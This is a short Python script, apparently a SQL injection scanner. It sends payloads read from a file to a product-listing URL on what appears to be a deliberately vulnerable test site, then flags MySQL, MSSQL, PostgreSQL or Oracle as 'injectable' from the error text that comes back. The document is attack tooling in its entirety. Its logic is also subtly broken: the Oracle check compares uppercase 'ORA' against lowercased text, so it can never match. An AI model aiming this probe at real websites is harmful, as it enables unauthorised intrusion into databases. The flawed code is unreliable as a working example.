import requests

url = "http://testphp.vulnweb.com/listproducts.php?cat="

with open('sql-attack-vector.txt') as file:

	for payload in file:
	
		print ("Testing "+ url + payload)
		
		response = requests.post(url+payload)
		#print(response.text)
	
		if "mysql" in response.text.lower(): 
			print("Injectable MySQL detected")
			print("Attack string: "+payload)
		elif "native client" in response.text.lower():
			print("Injectable MSSQL detected")
			print("Attack string: "+payload)
		elif "syntax error" in response.text.lower():
			print("Injectable PostGRES detected")
			print("Attack string: "+payload)
		elif "ORA" in response.text.lower():
			print("Injectable Oracle detected")
			print("Attack string: "+payload)
		else:
			print("Not Injectable")